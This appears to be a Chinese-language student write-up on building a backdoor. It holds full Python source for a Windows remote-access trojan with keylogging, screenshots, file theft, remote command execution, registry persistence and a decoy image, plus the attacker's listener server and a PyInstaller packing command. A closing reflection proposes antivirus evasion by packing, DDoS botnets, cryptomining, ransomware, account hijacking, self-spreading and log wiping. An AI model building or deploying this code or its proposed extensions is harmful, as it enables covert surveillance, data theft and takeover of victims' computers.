# 後門
```bash
$wine /home/kali/.wine/drive_c/python/Scripts/pyinstaller.exe client.py --onefile --noconsole --add-data "nttu.png;." --icon "nttu.ico"

```

## server.py程式碼
```python
#!/usr/bin/python
import subprocess
import socket
import json
import time
import os
import sys
import shutil
import base64
import requests
import ctypes
from mss import mss
import threading
import pynput.keyboard

ServerIP="210.240.#.#"先遮起來
ServerPort=54321
File_Location=os.environ["appdata"] + "\lol.exe"
ImageFile="\\nttu.png"
#kl_file = os.environ["appdata"]+"\lol.txt"
kl_file = 'lol.txt'
keys=""

def process_keys(key):
    global keys
    try:
        keys +=str(key.char)
    except AttributeError:
        if key==key.space:
            keys+=" "
        elif key==key.enter:
            key+="\n"

        elif key==key.up:
            exit

        elif key==key.down:
            exit
        elif key==key.left:
            exit
        elif key==key.right:
            exit
        else:
            keys=keys + " ["+str(key) + "] " 
def writekeys():
    global keys  
    with open(kl_file,"a") as klfile:
        klfile.write(keys)
        keys=""
        klfile.close()
        timer=threading.Timer(5,writekeys)
        timer.start()

def kl_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        writekeys() 
        keyboard_listener.join()
        
def reliable_send(data):
    json_data =json.dumps(data)
    s.send(bytes(json_data,encoding="utf-8"))
def reliable_recv():
    json_data=bytearray(0)
    while True:
        try:
            json_data+= s.recv(1024)
            
            return json.loads(json_data)
        except ValueError:
            continue
def connection():
    while True:
        try:
            s.connect((ServerIP,ServerPort))
            communication()
        except:
            time.sleep(5)
            continue
def communication():
    while True:
        command =reliable_recv()
        if command =="q":
            try:
                os.remove(kl.file)
            except:
                continue
            break
        elif command[:4] =="help":
            help_data = '''cd [path]
            download [filename]
            upload [filename]
            get [url]
            start [program]
            screenshot
            check
            keylog_start
            keylog_dump
            [cmd command]
            q'''
            reliable_send(help_data)
        elif command[:2] =="cd" and len(command)>1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            try:
                with open(command[9:],"rb") as file_down:
                    content = file_down.read()
                    reliable_send(base64.b64encode(content).decode("ascii"))
            except:
                failed="[!!] Fail to download!"
                reliable_send(failed)
        elif command[:6]=="upload":
            result =reliable_recv()
            if result[:4]!="[!!]":
                with open(command[7:],"wb") as file_up:
                    file_up.write(base64.b64decode(result))
        elif command[:3]=="get":
            try:
                url =command[4:]
                get_response = requests.get(url)
                file_name = url.split("/")[-1]
                with open(file_name,"wb") as out_file:
                    out_file.write(get_response.content)
                reliable_send("[+] File Downloaded!")
            except:
                reliable_send("[!!] Download Failed")
        elif command[:5]=="start":
            try:
                subprocess.Popen(command[6:],shell=True)
                reliable_send("[+] Program Started!")
            except:
                reliable_send("[!!] Program cannot start!!!")
        elif command[:10]=="screenshot":
            try:
                with mss() as screenshot:
                    screenshot.shot()
                with open("monitor-1.png","rb") as ss:
                    reliable_send(base64.b64encode(ss.read()).decode("ascii"))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] failed to take screenshot!")
        elif command[:5] =="check":
            try:
                os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
                reliable_send("[+] Great, You have admin priviledges")
            except:
                reliable_send("[!!]Sorry ,you are not admin")

        elif command[:12]=="keylog_start":
            kl_thread=threading.Thread(target = kl_start)
            kl_thread.start()
        elif command[:11]=="keylog_dump":
            with open(kl_file,"r") as file_down:
                 content = file_down.read()
                 reliable_send(content)
        else:
            proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            response=proc.stdout.read()+proc.stderr.read() 
            reliable_send(response.decode('cp950'))
        

if not os.path.exists (File_Location):
    shutil.copyfile(sys.executable,File_Location)
    #registry
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d "'+ File_Location+'"',shell=True)

img=sys._MEIPASS + ImageFile
try:
    subprocess.Popen(img,shell=True)
except:
    A = 1
    B = 2
    SUB = A+B

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
#print("connection Established!")

s.close()

```

server.py
```python
#!/usr/bin/python
import socket
import json
import base64
import datetime

HostIP="210.240.*.*"
HostPort=54321
def reliable_send(data):
    json_data =json.dumps(data)
    target.send(bytes(json_data,encoding="utf-8"))
def reliable_recv():
    json_data=bytearray(0)
    while True:
        try:
            json_data+=target.recv(1024)
        
            return json.loads(json_data)
        except ValueError:
            continue



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)


s.bind((HostIP,HostPort))


s.listen()
print("srver start!")
target,ip= s.accept()
print("Victim connect")


while True:
    command = input("* Shell#~%s: " %str(ip))
    reliable_send(command)
    if command =="q":
        break
    elif command[:2]== "cd" and len(command) >1:
        continue
    elif command[:8] =="download":
        result =reliable_recv()
        if result[:4] != "[!!]":
            with open(command[9:],"wb") as file_down:
                file_down.write(base64.b64decode(result))
        else:
            print(result)
    elif command[:6]=="upload":
        try:
            with open(command[7:],"rb")as file_up:
                content = file_up.read()
                reliable_send(base64.b64encode(content).decode("ascii"))
        except:
            failed = "[!!] Fail to upload!"
            reliable_send(failed)
            print(failed)
    elif command[:10] =="screenshot":
        image = reliable_recv()
        if image[:4]!= "[!!]":
            ss_file ="screen_" + str(ip) + datetime.datetime.now().strftime("_%Y-%m-%d_%H%M%S")+".jpg"
            with open(ss_file,"wb") as screen:
                screen.write(base64.b64decode(image))
        else:
            print(image)
    elif command[ :12] =="keylog_start":
        continue
    
    else:
        result =reliable_recv()
        print(result)

s.close()
```

死亡步驟
![](https://hackmd.io/_uploads/H1vFZSAUn.png)
看起來很普通的圖片打開變這樣
![](https://hackmd.io/_uploads/Sy_qbB0L2.png)
還是很普通

但server已經連到
![](https://hackmd.io/_uploads/B1W3ZrA8n.png)
![](https://hackmd.io/_uploads/S1l6ZHC83.png)

dir
![](https://hackmd.io/_uploads/SybyfrA8h.png)

download 1.jpg

![](https://hackmd.io/_uploads/SJWzGSAIn.png)

就被載到server端了
![](https://hackmd.io/_uploads/r1xgXfrCL3.png)

upload

![](https://hackmd.io/_uploads/H1DEMHC8n.png)

就傳過來了

![](https://hackmd.io/_uploads/HJ6Szr0I2.png)


get


![](https://hackmd.io/_uploads/HJO6HSALn.png)

![](https://hackmd.io/_uploads/S1CTrHA8n.png)

start

![](https://hackmd.io/_uploads/HkMzLSRUn.png)

![](https://hackmd.io/_uploads/S1jzIrALn.png)

screenshot
![](https://hackmd.io/_uploads/rJrNUS0U2.png)

![](https://hackmd.io/_uploads/BkKHIBCIh.png)

check

![](https://hackmd.io/_uploads/ry_UIrALh.png)

keylog_start

![](https://hackmd.io/_uploads/SJpF9BAIh.png)
![](https://hackmd.io/_uploads/HyD9qHAU2.png)

[這是yt連結](https://youtu.be/bwvewc-Telk)

覺得還有甚麼可以改進?600字心得

<font color='red'>
如何改進這個程式。我覺得可以加殼也就是加密壓縮方式，可以增加後門程式的機密性，它應該有機會可以幫助避免被Windows Defender等防毒軟體偵測。透過使用ASPACK、UPX、UPXSHELL、WWPACK32、Petitle等工具，我們可以對可執行檔進行壓縮和處理，提高其機密性並降低被檢測到的風險。當中我測試upx有幾個等級的壓縮方式，其中強化壓縮或到了比較高等級，會導致程式變形，所以還是要在一個臨界點進行壓縮，我還想到可以新增發動分散式阻斷服務攻擊功能來達到形成肉雞網路，就像應該市面上都是這樣用的，不過我想覺得要用這個要先寫可以多對一的整合功能，且有個ui介面會相對好操控多，然後可以植入挖礦程式，當然過程中回傳的東西我認為都要加密不能直接明文，當中server的ip被知道就有可會會被監聽，可能還會被中間人攻擊，server的ip也希望模糊化，避免被找到還有我希望可以機密硬碟，就像市面上想哭病毒那樣，需要付贖金等，然後可以偵測電腦綁定的帳號，例如各大社交媒體，可以幫他們改密碼，然後我還想到可以自動感染周遭設備，以及同個網域下的設備，這樣可以最快速傳播病毒，還有我覺得最重要的是做壞事不能被抓到，需要能進入日誌進行消除，清除後門程式在目標系統留下的痕跡，最後我想到的是綑綁，將木馬exe綑綁到正常遊戲裡面一些小遊戲，或是比較正常好康程式?序號程式等，達到偽裝成一個檔案，
</font>
